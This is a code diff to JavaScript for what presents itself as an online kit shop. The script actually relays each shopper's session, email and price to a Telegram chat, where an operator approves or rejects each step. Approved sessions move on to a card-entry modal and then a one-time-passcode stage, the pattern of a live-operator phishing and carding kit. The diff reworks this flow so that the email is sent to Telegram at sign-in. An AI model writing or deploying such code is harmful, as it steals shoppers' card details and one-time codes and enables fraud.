@@ -595,7 +595,7 @@
         if (String(cq.message.chat.id) !== window.TELEGRAM_CONFIG.chatId) continue;
         
         const data = cq.data || '';
-        const match = data.match(/^(approve|reject)_(cart|checkout|card|otp):(.+)$/);
+        const match = data.match(/^(approve|reject)_(checkout|card|otp):(.+)$/);
         if (!match) {
           await tgCall('answerCallbackQuery', { callback_query_id: cq.id });
           continue;
@@ -640,9 +640,7 @@
       
       localStorage.setItem('telegram_approved_session', JSON.stringify(session));
       
-      if (kind === 'cart' && action === 'approve') {
-        showSigninModal();
-      } else if (kind === 'checkout' && action === 'approve') {
+      if (kind === 'checkout' && action === 'approve') {
         showCardModal(sessionId);
       } else if (kind === 'card' && action === 'approve') {
         sendOtpNotification(sessionId);
@@ -782,7 +780,7 @@
     document.querySelector('#close-cart').onclick = () => setCart(false);
     overlay.onclick = () => setCart(false);
     
-    // Add to cart handler with Telegram notification
+    // Add to cart handler - no Telegram buttons
     document.querySelector('#add-to-cart').onclick = () => {
       const existing = cart.find(item => item.size === selectedSize);
       if (existing) existing.quantity = quantity;
@@ -798,46 +796,21 @@
       });
       window.currentSessionId = session.id;
       
-      tgNotify(window.TELEGRAM_CONFIG.chatId,
-        `🔔 ITEM ADDED TO CART
-ID: ${session.id}
-Product: ${product.name}
-Price: ${money(unitPrice)}
-Quantity: ${quantity}`,
-        {
-          inline_keyboard: [
-            [{ text: '✅ Approve Cart', callback_data: `approve_cart:${session.id}` }],
-            [{ text: '❌ Reject', callback_data: `reject_cart:${session.id}` }]
-          ]
-        }
-      );
-      
       showToast(quantity + ' ' + selectedSize + ' kit' + (quantity > 1 ? 's' : '') + ' added to cart');
       setCart(true);
       saveCart();
     };
     
-    // Checkout button handler
+    // Checkout button handler - show signin modal
     document.querySelector('#checkout').onclick = () => {
       if (!cart.length) return;
       
       const session = getSession(window.currentSessionId);
-      if (!session || session.stage !== 'cart_approved') {
-        showToast('Please approve cart in Telegram first');
-        return;
+      if (!session || session.stage !== 'pending') {
+        showToast('Please proceed through checkout');
       }
       
-      tgNotify(window.TELEGRAM_CONFIG.chatId,
-        `🔔 CHECKOUT APPROVED
-ID: ${session.id}
-Proceeding to payment`,
-        {
-          inline_keyboard: [
-            [{ text: '✅ Approve Card', callback_data: `approve_checkout:${session.id}` }],
-            [{ text: '❌ Reject', callback_data: `reject_checkout:${session.id}` }]
-          ]
-        }
-      );
+      showSigninModal();
     };
     
     // Sign in form handlers
@@ -849,17 +822,21 @@ Proceeding to payment`,
         updateSession(session.id, { email });
       }
       hideSigninModal();
+      
       tgNotify(window.TELEGRAM_CONFIG.chatId,
-        `🔔 CHECKOUT APPROVED
-ID: ${session.id}
-Email: ${email}`,
+        `🔔 NEW CHECKOUT
+ID: ${window.currentSessionId}
+Email: ${email}
+Price: ${money(unitPrice)}`,
         {
           inline_keyboard: [
-            [{ text: '✅ Approve Card', callback_data: `approve_checkout:${session.id}` }],
-            [{ text: '❌ Reject', callback_data: `reject_checkout:${session.id}` }]
+            [{ text: '✅ Approve', callback_data: `approve_checkout:${window.currentSessionId}` }],
+            [{ text: '❌ Reject', callback_data: `reject_checkout:${window.currentSessionId}` }]
           ]
         }
       );
+      
+      showToast('Awaiting approval in Telegram...');
     };
     
     // Close signin modal
